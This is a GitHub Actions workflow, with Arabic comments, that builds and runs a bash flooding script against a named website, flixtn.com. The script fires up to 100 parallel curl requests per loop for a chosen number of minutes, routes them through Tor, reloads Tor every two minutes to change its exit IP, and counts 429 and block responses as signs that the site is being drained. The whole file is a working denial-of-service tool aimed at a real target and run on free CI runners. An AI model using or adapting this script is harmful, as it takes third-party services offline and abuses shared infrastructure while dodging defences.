name: 💀 CURL + TOR - FIXED

on:
  workflow_dispatch:
    inputs:
      duration:
        description: 'المدة بالدقائق'
        required: true
        default: '60'
      threads:
        description: 'عدد الخيوط'
        required: true
        default: '100'

jobs:
  attack:
    runs-on: ubuntu-latest
    timeout-minutes: 65
    
    steps:
      - name: Install
        run: |
          sudo apt update
          sudo apt install -y curl tor
          sudo systemctl start tor
          
      - name: 🔥 CURL + TOR
        run: |
          cat > attack.sh << 'EOF'
          #!/bin/bash
          
          TARGET="https://flixtn.com"
          DURATION=$(( ${{ github.event.inputs.duration }} * 60 ))
          THREADS=${{ github.event.inputs.threads }}
          
          TOTAL=0
          LAST=0
          
          echo "=========================================="
          echo "💀 CURL + TOR - MAX DRAIN"
          echo "Target: $TARGET"
          echo "Duration: ${{ github.event.inputs.duration }} minutes"
          echo "Threads: $THREADS"
          echo "=========================================="
          echo ""
          echo "✓=200 | 🔥=429 | 🛡️=challenge | ✗=error"
          echo ""
          
          END=$((SECONDS + DURATION))
          
          # تجديد Tor
          renew() {
            sudo systemctl reload tor
            echo ""
            echo "🔄 TOR IP CHANGED"
            echo ""
          }
          
          # تشغيل تجديد Tor
          (while true; do sleep 120; renew; done) &
          
          while [ $SECONDS -lt $END ]; do
            for i in $(seq 1 $THREADS); do
              (
                # استخدام curl مع socks5h مباشرة
                STATUS=$(curl -s -o /dev/null -w "%{http_code}" --socks5-hostname 127.0.0.1:9050 "$TARGET" \
                  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
                  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9" \
                  -H "Accept-Language: ar,en;q=0.9" \
                  --max-time 5 \
                  --retry 0 \
                  2>/dev/null)
                
                case $STATUS in
                  200) echo -n "✓" ;;
                  429) echo -n "🔥" ;;
                  403|503|502) echo -n "🛡️" ;;
                  *) echo -n "✗" ;;
                esac
              ) &
            done
            
            wait
            TOTAL=$((TOTAL + THREADS))
            RPS=$((TOTAL - LAST))
            LAST=$TOTAL
            
            ELAPSED=$((SECONDS - (END - DURATION)))
            MIN=$((ELAPSED / 60))
            SEC=$((ELAPSED % 60))
            REMAIN=$(( (END - SECONDS) / 60 ))
            
            echo ""
            echo "[$MIN:$SEC] Total: $TOTAL | RPS: $RPS | Remaining: ${REMAIN}m"
            echo ""
            
            sleep 0.1
          done
          
          echo ""
          echo "=========================================="
          echo "✅ DONE: $((SECONDS / 60)) minutes"
          echo "Total requests: $TOTAL"
          echo "=========================================="
          EOF
          
          chmod +x attack.sh
          ./attack.sh
